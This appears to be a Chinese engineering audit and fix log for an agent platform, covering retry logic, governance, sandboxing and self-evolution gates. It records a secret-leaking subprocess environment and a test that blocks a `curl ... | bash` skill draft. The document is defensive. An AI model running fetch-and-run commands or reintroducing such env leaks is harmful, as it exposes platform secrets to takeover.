| P1-7 | **once trigger ack 语义已接入(2026-06-12)**:tick 不再预先递增 `fire_count` 或禁用 once;只写 `config._fire_inflight`。成功 invocation ack 后才更新 `last_fired_at/fire_count/is_enabled`;失败 path 清理 inflight 并走 backoff。证据见 §12.15 | `trigger_daemon.py` / `tests/services/test_trigger_daemon.py` | fresh inflight 会抑制重复触发;stale inflight 超时后可重试,不再静默蒸发 |
| P1-8 | **web chat startup resume 已接入(2026-06-12)**:startup 现在调用 `resume_persisted_web_chat_runs()`,把仍处 active 的 `web_chat_turn` 重新调度,并将 resumed ids 传给 orphan reconciler 排除,避免刚恢复即标 failed。证据见 §12.16 | `web_chat_runtime.py` / `main.py` / `runtime_task_service.py` | queued plan handoff 的 terminal cleanup 已由恢复后的 `execute_web_chat_run()` 继续执行;不再永久卡死 |
| P1-9 | **长任务 resume context 已接入 P1-8(2026-06-12)**:恢复 web-chat run 时构造 `build_long_task_resume_context()`,写入 `RuntimeTask.metadata_json.restart_resume_context`;执行时把 `resume_prompt` 注入 `system_prompt_suffix`。证据见 §12.16 | `web_chat_runtime.py` / `long_task_runtime.py` / `tests/services/test_web_chat_runtime.py` | 缺失 artifact 时记录 `restart_resume_context_error`,但恢复泵仍继续执行原 run |
| P1-11 | **Prometheus metrics 端点已接入(2026-06-12)**:memory 指标不再只停留在 admin JSON 与日志;新增无前缀 `/metrics` Prometheus text exporter,首批包含 extract failure ratio 与高失败率 gauge;后续已接 hook failure、prompt cache 与 daemon liveness。证据见 §12.21、§12.22、§12.28、§12.34 | `memory/metrics.py` / `api/metrics.py` / `main.py` | 后续继续把结构化 daemon trace 与更多业务 SLO 接入同一 exporter |
| P1-12 | **kernel hook 吞错已接入告警指标(2026-06-12)**:`RESPONSE_COMPLETE` / `PRE_COMPACTION` / `POST_COMPACTION` 失败不再只 debug 或 unobserved task exception;统一 warning + `hook_failure_total` + Prometheus 导出。证据见 §12.22 | `kernel/engine.py` / `runtime/hooks.py` / `memory/metrics.py` | 131 处泛 DEBUG 吞错仍按管线关键度分批;本批先封住记忆/压缩三条热路径 |
| P1-13 | **CI/eval gate 已接入(2026-06-12)**:新增 Harness CI 跑 pytest、memory retrieval/retirement eval、prompt_eval、internal eval、self-evolution bakeoff;`self_evolution_bakeoff` 的 Hive 侧从源码 marker 改为临时 workspace 行为场景,报告改用 `behavior_assertions`。证据见 §12.23 与 §12.33 | `.github/workflows/harness-ci.yml` / `memory/retrieval_eval.py` / `evals/self_evolution_bakeoff.py` / `docs/self-evolution-bakeoff-report.json` | CI 中 Hermes 为显式 baseline fixture;外部 Hermes live CLI 仍由 `core_v1` bakeoff runtime 环境化运行,不再把旧 92/85 字符串检查当北极星证据 |
| P1-14 | **HITL 审批结果回流已接入(2026-06-12)**:approval request 现在携带 origin session;批准执行后写 `ChatMessage(role=tool_call)` 并在 active web-chat run 上追加 `pending_user_messages`,让 kernel 下一轮 drain 继续推理。证据见 §12.24 | `approval_service.py` / `tools/governance.py` / `tools/governance_resolver.py` | Checkpoint 与 ApprovalRequest 的长期模型统一仍可继续收敛;当前不再是批准后结果脱离原会话 |
| P1-15 | **多实例防双跑 fail-closed 已接入(2026-06-12)**:trigger fire 与 heartbeat 的 Redis lease 异常不再本地放行;web chat active-run 互斥补上数据库 partial unique index,并在唯一冲突时回退为 durable queued message。证据见 §12.25 | `trigger_daemon.py` / `heartbeat.py` / `web_chat_runtime.py` / `runtime_task.py` / `web_chat_active_run_unique_0612.py` | 迁移会先把历史重复 active web-chat run 标 failed,再建唯一索引;非租约语义测试显式 stub lease,避免本地无 Redis 掩盖生产 fail-closed |

其余 P1(摘要):**OpenAI-compatible 流式中断 tombstone 已接入(2026-06-12,见 §12.26)**;**round aggregate tool-result spill 已接入(2026-06-12,见 §12.27)**;**prompt cache hit-rate metrics 已接入(2026-06-12,见 §12.28)**;**记忆双检索双注入已收敛为 memory/runtime/knowledge 三路单注入(2026-06-12,见 §12.29)**;**assembler 分数感知裁剪不再被二层 ratio 截断覆盖(2026-06-12,见 §12.30)**;**D6 repeated-feedback lane 已接入 frozen-Mission 矛盾门(2026-06-12,见 §12.31)**;**activation 死权重已接通(conf alias/open_loop bool/retention_score 派生/T2 metadata 透传,2026-06-12,见 §12.32)**;**PPR wiki/scene 检索已保留为显式 derived/eval 能力，但 2026-06-19 后不再默认进入主 prompt MemoryRetriever，避免和 accepted T3 四文件双源漂移**;**health 已从恒真改为 daemon-aware degraded 状态,Prometheus 导出 daemon liveness(2026-06-12,见 §12.34)**;**IM 通道轮次已统一进入 durable web-chat runtime wrapper,并补齐 Slack/DingTalk/Discord/Microsoft Teams 完成回投(2026-06-12,见 §12.35)**。

---

## 5. P2 与其余(简表)


本轮结论:§12.36-§12.48 列出的 P2 清单、部署红线、review 设计缺陷与全量测试漂移已清零;§12.45 的旧后端数字只保留为验收盲区复盘,当前后端真 PG 口径以 §12.48 最终复验为准。后续只保留本文其它章节已明确标出的系统性工程项与生产级复验项,不再把已实装项留作隐性 TODO。

---

## 6. 北极星三判定

### 6.1 「基础 agent 框架对齐 CC」——结构对齐成立,韧性未对齐

晴天面:统一入口、轮循环、压缩主干(P0-P2 逐项验证仍在线)、transient reminder(数值 10/10/5 与 CC 对齐)、截断/溢出数值面(50K/200K/keep5/60min 全部源自 CC)、prompt sections 骨架与 CC 静态段 1:1、plan/task/subagent/trigger 历次对标全部真实落地(trigger 三桶+objective 退役经本次复核 **100% 执行无漂移**)。净超越项见 §9。

雨天面是系统性缺口:重试矩阵(CC 10 次退避+分类驱动 vs Hive 仅网络连接/读取异常 3 次裸重试,429/5xx 零有效重试)、输出 cap 恢复(64K escalate+3 次 resume vs 静默断尾)、流中断恢复(tombstone vs 内容重复)、签名保真(剥除 vs 伪造)、steering(mid-turn drain vs 409/WS 丢弃)、可中断性(synthetic tool_result vs 等 180s)。**判定:对齐工作的下一仗不在功能面,在失败路径面。**

### 6.2 「记忆+自进化超越 CC 源码」——基础设施层成立,体感层不成立且无证据

真超越的五个维度(CC 源码核实其一概没有):写入纯净(write_gate/PL 分级/lane/lifecycle sidecar)、可逆生命周期(heat/退役/cap/archive)、审计(ledger/rollback_ref)、蒸馏 SOP 质量(HEARTBEAT.md 与 dream prompt 的 few-shot+反模式+决策矩阵明显优于 CC extractMemories 朴素 prompt)、多租户。D1-D10 纯净化债的旧快照已过期:截至 2026-06-13，D1/D2/D8/D10 不再是「代码就绪待生产执行」,已接 `app.memory.hygiene` + startup `migrate_all_workspaces()` 可逆 quarantine/backfill 路径；D5/D6 也已从旁路状态收口到 agent-tool lane gate 与 frozen-Mission gate。证据见 `docs/agent-memory-purity-spec.md` v0.4 与第二轮报告 §12.18。

落后的两个体感维度已从「断线」收敛为「质量差距」:①**学习时延**——explicit overlay 可立即激活，canonical T2/T3 仍按 reviewed Segment Package 和 T3 Gate 慢沉淀；旧 high-weight T2 只保留显式 legacy opt-in。②**读侧智能**——PPR wiki/scene 多跳保留为 derived/eval 能力，但默认 prompt memory 已收敛为 explicit overlay + accepted T3 + episodic recall；CC 主路径仍是 Sonnet manifest 选择器(LLM 判断)，Hive 主路径仍以确定性 scoring+窄条件 LLM rerank 为主。此前 DREAM.md 死模板、verification 同义反复、retrieval_eval 无调用、activation 死权重等断点已按 §12.18/§12.23/§12.31-§12.33 修掉;剩余差距必须靠持续 eval 与 live Hermes baseline 继续量化。

对 hermes:平台治理碾压(hermes 几乎零治理);单 agent 智能体验仍有差距,但闭环最后一跳已有实质推进——①T2 高权重反馈已可次回合检索 ②技能已可经验证后 patch ③错误记忆已可 governed update/retire ④「该学什么」已从字符串 marker 升级为 LLM classifier+fallback ⑤P1-13 已把 Hive 侧 bakeoff 改为行为场景,旧 `deterministic_checks/92 vs 85` 报告已更新为 `behavior_assertions` ⑥PPR 多跳 read model 已进入主检索并有 CI eval 守门。**剩余关键证据集中在外部 Hermes live CLI 环境化复跑、LLM manifest/rerank 主路化收益验证;做完前不要宣称「已超越」——当前 CI baseline 是显式 fixture,不是外部 Hermes 实时跑分。**

### 6.3 「企业级管控(权限+多租户隔离)」——治理链合格,两个地基洞+RLS 待二翻

合格面:治理链结构完整无绕过(唯一旁路入口零生产调用方)、fail-closed 严谨、权限模型粒度(role×agent×capability×zone)企业够用、A2A 强制同租户、文件/Redis/MCP 隔离健康、secrets 加密(Fernet+HKDF)与 API mask 在线。

不成立面:①**执行隔离**(P0-G1/G2)——env 密钥透传+无 OS 沙箱,使「任一被授权 run_command 的 agent 可拿下全平台」,这是当前 Goal-2 不成立的头号原因,优先级高于 RLS 二次验收;②**资源管控**——预算 enforcement 死代码(P1-1),配额是「记录不 enforce」;③RLS stage-3 需要 pre-auth 必修清单+防回潮守卫(P1-G4)+生产登录/CRUD/红队验收。**判定:可达;攻坚序 = 沙箱/env 白名单 → 预算硬门+bare-session 守卫 → RLS 二次验收 → HITL 统一/审计持久化。**

---

## 7. built-but-unwired 死线总账(「绿测试≠完成」全景)

本次审计跨分区共发现 **11 处「代码存在、生产死线」**,集中暴露同一病根:

| # | 死线 | 位置 |
|---|---|---|
| 1 | 429 重试分支不可达(无 raise_for_status) | `llm_client.py:685-697` |
| 2 | `check_user_token_quota` 生产零调用方,quota_message 写死 None | `quota_guard.py:24` |
| 3 | `recovery_manifest.json` 写了无读者(prompt_builder 零引用) | `engine.py:1688-1730` |
| 4 | `build_long_task_resume_context` 唯一消费方是 admin 验证报告 | `long_task_runtime.py:177` |
| 5 | `workflow_completed` 信号生产零消费方 | `workflow_runtime_service.py:944` |
| 6 | subagent 完成唤醒:写内存读 PG,默认配置生产空转 | `coordination_wiring.py:38` |
| 7 | `decide_verified_promotion` 零生产调用方;llm_rubric 不调 LLM | `evolution_verification.py:114` |
| 8 | skill 候选草稿文件全仓无读取方 | `skill_flywheel.py:115` |
| 9 | DREAM.md 模板从未被加载,测试却钉其内容 | `auto_dream.py:1099` |
| 10 | `record_feedback`→calibration→charter proposals 三级死线 | `decision_trace.py:66` |
| 11 | `extract_cache_metrics` 定义后全仓无调用(cache 观测盲) | `prompt_cache.py:233` |

附:`retrieval_eval.py` 无调用方与 activation 死权重已在 §12.32/§12.33 移出死线;`sequence_num` 列写入方不赋值仍属此族。**建议在 CI 加一条「公开函数零调用方」的定期盘点(或对每个 feature PR 强制回答验收三查),把这个病根制度化地堵住。**

---

## 8. 攻坚路线(四仗,可并行度高)

**第一仗:雨天工程(失败路径)——「成熟长任务 harness」的本质一仗**
K1 重试矩阵(客户端 withRetry 等价物)→ D1 reconciler 一行过滤 → D2 signal 统一 gateway → D3 timeout 表+spawn 后台化 → P1-3 输出 cap escalate+resume → K2 签名透传 → 流重试清累积器+tombstone 事件 → P1-7 once trigger ack 语义 → P1-8 重启泵(顺手接 P1-9 的 resume context)→ P1-10 完成推送 → IM channel durable run wrapper(已完成,见 §12.35)。
*多数是小改动;extract queue 的「enqueue→ack→startup replay」可提为 house pattern 直接套用。*

**第二仗:执行隔离+资源管控(Goal-2 地基)**
G1 env 白名单(立即)→ G2 沙箱(短期 bwrap/mount-namespace 绑定单 agent 目录;中期评估 microVM 路线)→ P1-1 预算硬门(user+tenant fail-closed)→ P1-G4 bare-session AST 守卫 → RLS stage-3 二次验收(按 pre-auth 必修清单 + Testcontainers 红测四件套)→ P2-G7 生产空 master key fail-fast。

**第三仗:进化最后一跳(Goal-1 体感)**
M1 真验证门 → M2 fast_reflection LLM 化 → M3 DREAM.md 裁决 → P1-4 T2 高权重进检索 → P1-5 技能修补通路 → P1-6 update/retire 记忆工具 → P1-13 Hive 行为级 bakeoff/CI gate → P1-D6 机械 lane frozen gate → activation metadata 接通 → PPR 主检索+持续 eval 均已接入;剩余主线:外部 Hermes live CLI 环境化复跑与 LLM manifest/rerank 主路收益验证(做完前撤回「已超越」表述)。

**第四仗:可观测地基**
invocation_id 贯通(一表+一 ContextVar,撬动 O1/O2/审计链关联)→ O3 工厂 usage 回调+token_usage_events 表 → P1-11 Prometheus 端点+首批告警(已完成,见 §12.21) → P1-12 kernel 三 hook 吞错升级(已完成,见 §12.22) → P1-13 CI/eval gate(已完成,见 §12.23) → health 真实化+daemon liveness(已完成,见 §12.34)。结构化 daemon trace 与更多业务 SLO 仍是后续独立观测面。
*第四仗建议最先动工——它为前三仗提供验证仪表。*

**cache 经济修复**(C1 迁时钟/热度表出 system、C2 real-usage 锚+CJK cpt、C3 microcompact 空闲语义)可并入第一仗或独立小 PR 串行推进,修复哲学一句话:**CC 上下文管线的组织原则是「prefix 字节稳定 + 真实 token 锚」,Hive 引入了机制但没继承原则。**

---

## 9. 健康面(校准——这些是真的好,部分净超越基准)

- **LoopGuard 三通道语义检测 + warn-before-abort**:CC 没有的能力,Hive 净超越。
- **transient reminder 调度器**(不污染持久转录):对位 CC attachment 通道且实现干净,M1/M2 修复在线。
- **压缩恢复语境分层**(soul/ledger/T3 四文件/近 5 文件×8K/manifest):比 CC 的 5 文件恢复更结构化;压缩摘要 11 字段是 CC 9 节超集+autonomy_run_state(CC 无)。
- **tool result 取回指针进 read_file 闭环**:单条 spill→文件+4K 预览,优于 CC 的 2KB 预览。
- **workflow 引擎质量**:三层 journal+definition hash 校验+外部步 `unknown_requires_reconciliation` 拒自动重放——超越多数自建引擎的正确设计(Temporal 同款语义)。
- **extract queue**:enqueue 先持久→ack 后删→startup replay+幂等 key,全仓最佳 durable 样板,教科书级。
- **治理链**:fail-closed 严谨、无绕过路径(grep 级验证)、CAPABILITY_MAP 全工具覆盖+STRICT fail-closed。
- **多 provider 适配(L3 正资产)**:max_input_tokens hint 全链贯通、PTL 模式串多 provider、cache hints 能力驱动;Anthropic 客户端把尾部 system 降级为 user "[System Notice]" 是现成的 CC system-reminder 形态。
- **蒸馏 SOP prompt 质量**(HEARTBEAT.md/dream JSON prompt):few-shot+反模式+决策矩阵,明显优于 CC extractMemories 与 hermes 的朴素 prompt。
- **D1-D10 偿还**:旧「6 已修、2 部分、2 待生产执行」口径已撤回;当前代码口径为 D1/D2 sidecar+startup backfill、D3/D4 duplicate/retire/archive、D5 lane gate、D6 frozen-Mission gate、D7 slim index、D8 retired artifact quarantine、D9 PII 时间误杀修复、D10 dead stub quarantine 均有回归测试。
- **owner 可见性面**(相对最好的观测环):activity+tool-failures 聚合、autonomy overview 带人话映射、evolution 视图。

---

## 10. 文档/记忆漂移更正(审计副产物,需同步)

1. **「T2 无 retention」挂账可销**:吸收标记+30 天归档已上线(`heartbeat.py:1676`、`auto_dream.py:1230-1248`)。
2. **「detached plan 是桩」已过时**:自 06-08 起 detached = once trigger(`plan_mode_detached_handoff.py:34`),但带来 P1-7 的至多一次问题。
3. **「DR flag 禁开」已过时**:DR 专用 flag 已不存在,workflow 单一路径,`WORKFLOW_RUNTIME_ENABLED` 默认 True。
4. **trigger 三桶+objective/focus/supervision 退役 100% 执行完毕**,文档与代码一致,无漂移。
5. **CLAUDE.md「heartbeat 45min」过时**:实际默认 120min(`config.py:126`);`heartbeat.py:591` 注释同陈旧。
6. **sota-plan §2.3 两处过时**:skill_candidate_loop 默认已为 True;dream 已是 24h。
7. **CLAUDE.md 对 DREAM.md 的描述失实**(见 P0-M3);Memory Control Plane 中 feedback→decision 链接能力生产不存在(见 P0-O2)——两处宣称需修正或实现。

---

## 11. 当前 HEAD 复核命令

本节用于防止审计文档再次漂移。每次准备修复或引用本文结论前,先在当前 checkout 上重跑这些只读命令;若输出与本文不一致,以 live code 为准。

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
git status --short --branch
git rev-parse --short HEAD
git log --oneline -8
```

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
rg -n "synthetic_signature|HTTPStatusError|resp.status_code >= 400|finish_reason|safe_env = dict\\(os.environ\\)|check_user_token_quota|DecisionTraceStore|_DREAM_TEMPLATE_PATH" backend/app --glob '!backend/tests/**'
rg -n "reconcile_orphaned_runtime_tasks|RuntimeTask.status == \"running\"|_TOOL_TIMEOUTS|get\\(tool_name, 30\\.0\\)|COORDINATION_BACKEND|workflow_completed" backend/app --glob '!backend/tests/**'
rg -n "SCHEMA_DATABASE_URL|RLS_BACKFILL_ON_DEPLOY|grant_rls_app_role|alembic upgrade head|create_all|enter_rls_bypass|tenant_scoped_session" backend/app backend/entrypoint.sh backend/alembic --glob '!backend/tests/**'
```

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/services/test_llm_client_token_limits.py tests/services/test_runtime_task_service.py tests/tools/test_service.py tests/services/test_decision_trace.py -q
```

文档编辑本身不要求 TDD;任何后续逻辑修复必须先补回归测试,再改实现。

---

## 12. 整改日志与证据

### 12.1 2026-06-12 第一批:失败路径 + startup 恢复 + 长工具 timeout + subprocess env

**范围**
- P0-K1: LLM HTTP status retry matrix 的第一性断点;覆盖 OpenAI-compatible complete/stream、OpenAI Responses complete、Gemini complete/stream、Anthropic complete/stream。
- P0-K2: Anthropic thinking 无签名不再伪造 synthetic signature。
- P0-D1: startup orphan reconciler 不再把 workflow run 标 failed。
- P0-G1: agent-controlled subprocess 不再继承平台进程 secret env;同类 `dict(os.environ)` 执行路径统一收口。

**代码证据**
- `backend/app/services/llm_client.py`:新增 `_post_with_status_retries()`、`_is_retryable_http_status()`、`_retry_after_seconds()`;streaming status 分支按同一 retry 策略处理;`to_anthropic_format()` 删除 synthetic signature。
- `backend/app/services/runtime_task_service.py`:startup reconcile 查询和循环内均排除 `task_type == "workflow"`。
- `backend/app/tools/service.py`:新增模块级 `TOOL_TIMEOUTS`,长任务工具显式 180s。
- `backend/app/services/subprocess_env.py`:新增共享 `build_agent_subprocess_env()` 白名单环境;`code_exec.py`、`hr.py`、`evals/bakeoff_runtime.py` 均接入。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/services/test_llm_client_streaming.py \
  tests/services/test_runtime_task_service.py::test_reconcile_orphaned_runtime_tasks_preserves_workflow_runs \
  tests/tools/test_service.py::test_tool_runtime_service_long_running_tools_have_explicit_timeout \
  tests/services/test_command_tooling.py -q
```

初始结果:7 failed,4 passed。失败覆盖 unsigned thinking 被 synthetic signature 污染、HTTP 429 status 不重试、workflow run 被误标 failed、长工具仍是 30s timeout、subprocess env 泄漏平台 secret。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
python -m py_compile app/services/llm_client.py app/services/runtime_task_service.py app/tools/service.py app/services/subprocess_env.py app/services/agent_tool_domains/code_exec.py app/tools/handlers/hr.py app/evals/bakeoff_runtime.py
pytest tests/services/test_llm_client_streaming.py \
  tests/services/test_runtime_task_service.py::test_reconcile_orphaned_runtime_tasks_preserves_workflow_runs \
  tests/tools/test_service.py::test_tool_runtime_service_long_running_tools_have_explicit_timeout \
  tests/services/test_command_tooling.py -q
```

当前结果:12 passed,3 warnings。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

**残余边界**
- P0-G2 OS 级沙箱未由本批替代;env 白名单只是 G1 完成项。
- P1-8/P1-10 的长任务重启泵与完成回流未由 D3 timeout 修复替代;D3 只消除 30s 误杀。
- K1 已覆盖 `llm_client.py` 内 HTTP status 路径;daemon persistent retry / fallback policy 的更高层语义仍需在后续雨天工程批次继续收敛。

### 12.2 2026-06-12 第二批:P0-D2 workflow completion signal gateway 统一

**范围**
- `workflow_completed` 写侧不再硬编码 `coordination_runtime`;改为 `gateway_scope(tenant_id=...)`。
- 这使 memory/postgres 两种 `COORDINATION_BACKEND` 由同一 gateway 决策点负责,避免 workflow runtime 与 daemon/consumer 使用不同总线。

**代码证据**
- `backend/app/services/workflow_runtime_service.py`:导入 `gateway_scope`;`_emit_completion_signal()` 改为 async,并通过 `await gateway.send_signal(...)` 发出 `workflow_completed`;终态写回处 `await self._emit_completion_signal(..., tenant_id=tenant_id)`。
- `backend/tests/services/test_workflow_completion_signal_gateway.py`:新增纯单元测试,monkeypatch `gateway_scope` 验证 tenant_id 和 signal payload 都从统一 gateway 通过。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/services/test_workflow_completion_signal_gateway.py -q
```

初始结果:1 failed。失败点: `workflow_runtime_service` 模块没有 `gateway_scope`,说明 workflow completion 仍硬编码 in-process runtime。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
python -m py_compile app/services/workflow_runtime_service.py
pytest tests/services/test_workflow_completion_signal_gateway.py -q
```

当前结果:1 passed。

**残余边界**
- 本批统一的是 workflow completion signal 的写侧。`drain_subagent_completion_wakes` / `drain_signal_resumes` 的消费行为、完成后主动推送用户/父 agent 的 P1-10 仍需独立完成。

### 12.3 2026-06-12 第三批:P0-M1 self-evolution promotion gate 实化

**范围**
- `llm_rubric` 不再接受调用方预填 `passed` 布尔作为通过证据;当前实现 fail-closed,提示改用 executable verifier。
- 新增 `skill_guard` verifier,可直接验证内存中的 `SKILL.md` 内容或 workspace 相对路径。
- `skill_flywheel` 不再用「模板自带 status 字符串」做同义反复 state_check;改用 `skill_guard`。
- `skill_distiller` 不再先落盘再用 `draft.confidence` 记通过 eval;改为晋升前执行 `skill_guard`,并把 verification report 写入 `evolution_eval_run.v1`。

**代码证据**
- `backend/app/services/evolution_verification.py`:新增 `_run_skill_guard_check()`;`_run_llm_rubric_check()` 改为 fail-closed;`record_verification_eval()` 保留完整 `verification_report`。
- `backend/app/services/skill_flywheel.py`:candidate draft 的 grader 从自证 `state_check` 改为 `{"type":"skill_guard","path":...}`。
- `backend/app/services/skill_distiller.py`:promotion 顺序改为 `record_evolution_candidate()` → `run_evolution_verification(skill_guard)` → `record_verification_eval(dataset="skill_distiller.verified_skill_guard")` → `decide_verified_promotion()` → exact LLM-authored `SKILL.md.draft` commit；verification failed 时只记录 held decision,不写入 `skills/`。
- `backend/tests/services/test_evolution_verification.py`:覆盖 `skill_guard` 正/反例与 `llm_rubric` fail-closed 行为。
- `backend/tests/services/test_skill_flywheel.py`:断言 flywheel eval report 的唯一 check 是 `skill_guard`。
- `backend/tests/services/test_skill_distiller.py`:断言 distiller ledger 保存 `skill_guard` verification report;危险 `curl ... | bash` 草稿返回 deferred 且 skill 文件不存在。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/services/test_evolution_verification.py::test_evolution_verification_supports_skill_guard_grader \
  tests/services/test_evolution_verification.py::test_evolution_verification_skill_guard_rejects_unsafe_skill \
  tests/services/test_skill_flywheel.py::test_skill_flywheel_creates_candidate_draft_from_repeated_fast_reflection -q
```

初始结果:3 failed。失败点:`skill_guard` grader unknown;flywheel eval report 仍是同义反复 `state_check`。

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/services/test_skill_distiller.py::test_run_skill_distillation_cycle_promotes_high_confidence_candidate \
  tests/services/test_skill_distiller.py::test_run_skill_distillation_cycle_blocks_unsafe_skill_draft -q
```

初始结果:2 failed。失败点:正向 promotion 的 dataset 仍是 `skill_distiller.internal_workflow_repeats`;危险草稿路径没有 verifier ledger,证明旧实现没有在晋升前产生可执行验证证据。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/services/test_evolution_verification.py tests/services/test_skill_flywheel.py tests/services/test_skill_distiller.py -q
```

当前结果:27 passed,4 warnings。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

**残余边界**
- 本批消除的是「恒真/自评 promotion gate」。更强的 evaluator matrix(技能加载烟测、实际工具 dry-run、人类确认 UI)可以继续叠加,但不能替代本批已经落地的 fail-closed verifier 入口。

### 12.4 2026-06-12 第四批:P0-M3 DREAM.md 接入生产 prompt 并修正 memory 写入语义

**范围**
- `DREAM.md` 不再只是被测试钉住的死模板;生产 `_AUTO_DREAM_SYSTEM_PROMPT` 会加载其协议内容。
- 加载时截断 legacy `## Required Output Format` 段,避免 `[DREAM:complete]` / `[DREAM:noop]` 与当前 JSON-only dream consolidator 输出契约冲突。
- `DREAM.md` 不再教 agent 通过 `write_file/edit_file` 直接改 `memory/`;改为 Memory Control Plane + internal dream writeback service 语义。

**代码证据**
- `backend/app/services/auto_dream.py`:新增 `_load_dream_protocol_instruction()`;`_DREAM_TEMPLATE_PATH` 上移到 runtime prompt 构造前;`_AUTO_DREAM_SYSTEM_PROMPT` 注入 `<dream_protocol>...</dream_protocol>`。
- `backend/app/templates/DREAM.md`:Phase 2 写入指令改为 Memory Control Plane/internal writeback,并明确 `write_file/edit_file under memory` 被 runtime policy 拒绝。
- `CLAUDE.md`:同步 dream cadence 与已接入 `DREAM.md` 的 runtime 口径,删除「DREAM.md 只是程序文件维护」的失实描述。
- `backend/tests/services/test_auto_dream.py`:断言 system prompt 包含 `DREAM.md` 协议内容,且不包含 legacy `[DREAM:complete]` / `[DREAM:noop]`。
- `backend/tests/runtime/test_dream_template.py`:断言模板保持 Memory Control Plane 写入边界。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
python -m py_compile app/services/auto_dream.py
pytest tests/services/test_auto_dream.py::TestDreamSystemPromptStructure \
  tests/runtime/test_dream_template.py \
  tests/services/test_distillation_boundary_contracts.py::test_dream_prompts_do_not_promote_operational_autonomy_state_to_soul \
  tests/services/test_distillation_boundary_contracts.py::test_dream_template_preserves_t2_retention_provenance \
  tests/test_memory_integration.py::TestPromptIntegration::test_v17_dream_md_has_4_phases -q
```

初始有效失败:1 failed,39 passed。失败点:新增模板边界测试未看到稳定的 `Memory Control Plane` 短语,暴露模板文案仍不满足可搜索/可审计的边界表达。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
python -m py_compile app/services/auto_dream.py
pytest tests/services/test_auto_dream.py::TestDreamSystemPromptStructure \
  tests/runtime/test_dream_template.py \
  tests/services/test_distillation_boundary_contracts.py::test_dream_prompts_do_not_promote_operational_autonomy_state_to_soul \
  tests/services/test_distillation_boundary_contracts.py::test_dream_template_preserves_t2_retention_provenance \
  tests/test_memory_integration.py::TestPromptIntegration::test_v17_dream_md_has_4_phases -q
```

当前结果:40 passed,4 warnings。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.5 2026-06-12 第五批:P0-M2 fast reflection 智能分类与候选草稿消费

**范围**
- fast reflection 信号分类从 marker-first 改为 classifier-first;机械 marker 保留为失败/无模型时的可观测 fallback。
- RESPONSE_COMPLETE 后台 hook 尝试用 tenant summary model 输出 `fast_reflection_classification` JSON,不阻塞用户响应;失败返回 None,由同步 service fallback。
- `candidate_signal.md` / LLM-authored `SKILL.md.draft` 不再是死目录;skill distiller 会扫描 inactive Skill Candidate Packages 并把它们作为 drafting evidence 注入 LLM prompt。

**代码证据**
- `backend/app/runtime/hooks_setup.py`:新增 `_classify_fast_reflection_signal_with_llm()` 与 `_parse_fast_reflection_classifier_json()`;`_fast_reflection_on_response()` 将 classifier 结果写入 metadata 后再 schedule candidate。
- `backend/app/services/fast_reflection_service.py`:新增 `fast_reflection_classification` metadata 优先路径;ledger metadata 记录 `classification_method` / `classification_confidence`;marker/regex fallback 已退役，结构化 repeated workflow metadata 标记为 `structured_metadata`，纯文本 marker 不再生成候选。
- `backend/app/services/skill_distiller.py`:新增 `load_flywheel_skill_candidate_drafts()`;`_draft_skill_with_llm()` 新增 `flywheel_skill_candidate_drafts` prompt block;`run_skill_distillation_cycle()` 将草稿传入 drafting 阶段。
- `backend/tests/services/test_fast_reflection_candidate.py`:覆盖 LLM classifier 覆盖 marker、LLM low_signal 抑制 marker fallback。
- `backend/tests/runtime/test_fast_reflection_hook.py`:覆盖 hook 将 classifier 结果透传到 scheduler metadata。
- `backend/tests/services/test_skill_distiller.py`:覆盖 distiller 读取 `evolution/skill_candidates/<id>/candidate_signal.md` 或 LLM-authored `SKILL.md.draft` 并传给 `_draft_skill_with_llm()`。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/services/test_fast_reflection_candidate.py::test_fast_reflection_prefers_llm_classification_over_marker_fallback \
  tests/services/test_fast_reflection_candidate.py::test_fast_reflection_llm_low_signal_suppresses_marker_fallback \
  tests/runtime/test_fast_reflection_hook.py::test_response_complete_fast_reflection_hook_schedules_non_blocking \
  tests/services/test_skill_distiller.py::test_run_skill_distillation_cycle_promotes_high_confidence_candidate -q
```

初始结果:4 failed。失败点:classifier metadata 被 marker 覆盖;low_signal 无法抑制 marker fallback;hook 没有 classifier 函数;distiller 未传 `skill_candidate_drafts`。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
python -m py_compile app/services/fast_reflection_service.py app/runtime/hooks_setup.py app/services/skill_distiller.py
pytest tests/services/test_fast_reflection_candidate.py \
  tests/runtime/test_fast_reflection_hook.py \
  tests/services/test_skill_flywheel.py \
  tests/services/test_skill_distiller.py -q
```

当前结果:30 passed,4 warnings。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.6 2026-06-12 第六批:P0-C2 compaction 使用真实 usage anchor

**范围**
- compaction 触发不再只相信字符估算;当 provider 返回的 usage anchor 更高时,按真实 usage pressure 触发。
- kernel 把已确认 usage 写回 session metadata,并在后续 compaction 判断中传入。

**代码证据**
- `backend/app/services/memory_service.py`: `maybe_compress_messages()` 新增 `usage_anchor_tokens`;`current_tokens=max(estimated_tokens, usage_anchor_tokens)`。
